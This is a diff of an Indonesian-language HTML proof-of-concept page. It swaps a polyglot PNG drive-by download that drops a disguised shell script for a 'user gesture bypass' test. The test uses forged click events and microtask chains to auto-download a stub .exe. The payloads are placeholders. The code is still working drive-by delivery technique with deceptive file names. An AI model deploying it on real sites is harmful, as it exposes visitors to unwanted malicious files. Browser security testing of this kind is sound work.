@@ -1,114 +1,96 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Auto Download Two-Stage Payload (PNG -> SH)</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
-        .panel { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); max-width: 600px; width: 100%; }
-        h2 { color: #d32f2f; margin-bottom: 10px; }
-        p { margin-bottom: 20px; line-height: 1.6; color: #555; }
-        #status { margin-top: 20px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; border: 1px solid #ffcdd2; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>User Gesture Bypass Test</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
+.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
+h2 { margin-bottom: 10px; }
+p { margin-bottom: 15px; line-height: 1.5; }
+button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
+button:hover { background: #b71c1c; }
+#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
+</style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h2>Auto Download Two-Stage Payload</h2>
-    <p>Halaman ini akan otomatis mengunduh file gambar PNG (Polyglot) saat dimuat. Buka file PNG tersebut di browser untuk memicu unduhan file .sh.</p>
+    <h2>User Gesture Bypass Vulnerability</h2>
+    <p>Menguji apakah browser bisa ditipu untuk mengizinkan unduhan otomatis tanpa interaksi fisik, menggunakan pemalsuan event dan rantai microtask.</p>
     
-    <div id="status" role="status">Mempersiapkan unduhan otomatis...</div>
+    <button id="start-btn" type="button">Mulai Uji Bypass</button>
+    <div id="status" role="status">Sistem siap.</div>
 </div>
 
 <script>
+    const startBtn = document.getElementById("start-btn");
     const statusDiv = document.getElementById("status");
 
-    // 1. Payload .sh yang akan diunduh pada tahap kedua
-    const shellScript = "#!/bin/bash\n" +
-                        "echo 'HACKED BY WAGURI (Stage 2)'\n" +
-                        "open -a Calculator\n";
-
-    // 2. Kode HTML yang disisipkan ke dalam PNG (Polyglot)
-    const htmlPayload = `
-        <!DOCTYPE html>
-        <html>
-        <head><title>Image Viewer</title></head>
-        <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%;">
-            <h1>Memuat Gambar...</h1>
-            <p id="status">Menyiapkan file pendukung...</p>
-            <script>
-                const downloadSh = () => {
-                    const shContent = ${JSON.stringify(shellScript)};
-                    const blob = new Blob([shContent], { type: 'application/x-sh' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'update_system.sh';
-                    document.body.appendChild(a);
-                    a.click();
-                    document.getElementById('status').innerText = 'File .sh berhasil diunduh!';
-                };
-                setTimeout(downloadSh, 1000);
-            <\/script>
-        </body>
-        </html>
-    `;
-
-    // 3. Membuat file PNG asli (Base64) dan menyisipkan HTML di dalamnya
-    const createPolyglotPng = () => {
-        return new Promise((resolve) => {
-            const pngBase64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
-            const binaryPng = atob(pngBase64);
-            const pngBytes = new Uint8Array(binaryPng.length);
-            for (let i = 0; i < binaryPng.length; i++) {
-                pngBytes[i] = binaryPng.charCodeAt(i);
-            }
-
-            const encoder = new TextEncoder();
-            const htmlBytes = encoder.encode(htmlPayload);
-
-            const combinedBytes = new Uint8Array(pngBytes.length + htmlBytes.length);
-            combinedBytes.set(pngBytes, 0);
-            combinedBytes.set(htmlBytes, pngBytes.length);
-
-            const blob = new Blob([combinedBytes], { type: 'image/png' });
-            resolve(blob);
-        });
-    };
-
-    // 4. Pemicu Unduhan Otomatis (Drive-by Download)
-    const autoDownload = async () => {
-        statusDiv.textContent = "Membuat file gambar PNG (Polyglot)...";
-        
-        try {
-            const imageBlob = await createPolyglotPng();
-            const url = URL.createObjectURL(imageBlob);
-            
-            const a = document.createElement("a");
-            a.href = url;
-            a.download = "foto_liburan.png";
-            
-            document.body.appendChild(a);
-            a.click();
-            
-            setTimeout(() => {
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-                statusDiv.textContent = "File PNG terunduh otomatis! Buka file tersebut di browser untuk memicu file .sh.";
-                statusDiv.style.color = "#4CAF50";
-            }, 1000);
-
-        } catch (e) {
-            statusDiv.textContent = "Gagal: " + e.message;
-            statusDiv.style.color = "#f00";
+    const speak = (message) => {
+        if ('speechSynthesis' in window) {
+            window.speechSynthesis.cancel();
+            const utterance = new SpeechSynthesisUtterance(message);
+            utterance.lang = 'id-ID';
+            window.speechSynthesis.speak(utterance);
         }
     };
 
-    // MEMICU OTOMATIS SAAT HALAMAN DIMUAT
-    window.addEventListener('load', () => {
-        setTimeout(autoDownload, 500);
+    startBtn.addEventListener("click", () => {
+        startBtn.disabled = true;
+        statusDiv.textContent = "Memicu Bypass...";
+        speak("Memulai uji bypass.");
+
+        // Simulasi payload EXE (MZ Header)
+        const b64Data = "TVqQAAMAAAAEAAAAAEEAAgBA";
+        const binary = atob(b64Data);
+        const bytes = new Uint8Array(binary.length);
+        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+
+        // Fungsi untuk memicu unduhan
+        const triggerDownload = () => {
+            try {
+                const blob = new Blob([bytes], { type: 'application/octet-stream' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'bypassed-payload.exe';
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                
+                // TRIK 1: Palsukan event klik fisik (MouseEvent)
+                const clickEvent = new MouseEvent('click', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true
+                });
+                a.dispatchEvent(clickEvent); 
+                
+                // TRIK 2: Panggil a.click() secara langsung
+                a.click();
+
+                statusDiv.textContent = "Unduhan dipicu via Event Palsu!";
+                statusDiv.style.color = "#4CAF50";
+
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                }, 3000);
+            } catch (e) {
+                statusDiv.textContent = "Gagal: " + e.message;
+                statusDiv.style.color = "#f00";
+            }
+        };
+
+        // TRIK 3: Rantai Asinkron (Microtask) yang cepat
+        // Terkadang browser menganggap microtask yang berjalan cepat masih bagian dari "gesture"
+        queueMicrotask(() => {
+            queueMicrotask(() => {
+                triggerDownload();
+            });
+        });
     });
 </script>
 </body>
